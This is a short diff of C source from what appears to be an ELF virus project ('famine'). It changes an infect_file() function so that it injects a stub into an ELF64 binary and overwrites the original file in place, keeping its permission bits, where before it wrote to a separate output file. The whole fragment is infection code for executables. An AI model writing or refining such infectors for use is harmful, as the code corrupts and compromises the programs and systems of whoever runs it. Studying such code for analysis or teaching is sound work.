@@ -1,15 +1,15 @@
 #include "../include/famine.h"
 
-int infect_file(const char *in_path, const char *out_path)
+int infect_file(const char *path)
 {
 	t_famine	f;
 	struct stat st;
 	void		*map;
 	int			fd;
 
-	fd = open(in_path, O_RDONLY);
+	fd = open(path, O_RDONLY);
 	if (fd < 0)
-		return (LOG("open(%s) failed\n", in_path), 1);
+		return (LOG("open(%s) failed\n", path), 1);
 	if (fstat(fd, &st) < 0 || st.st_size < (off_t)sizeof(Elf64_Ehdr))
 		return (LOG("fstat/size check failed\n"), close(fd), 1);
 
@@ -36,9 +36,9 @@ int infect_file(const char *in_path, const char *out_path)
 
 	inject_stub(&f);
 
-	fd = open(out_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+	fd = open(path, O_WRONLY | O_TRUNC, st.st_mode & 07777);
 	if (fd < 0)
-		return (LOG("open(%s) for write failed\n", out_path), free(f.out), 1);
+		return (LOG("open(%s) for write failed\n", path), free(f.out), 1);
 	if (write(fd, f.out, f.out_size) != (ssize_t)f.out_size)
 		return (LOG("write failed\n"), close(fd), free(f.out), 1);
 	close(fd);
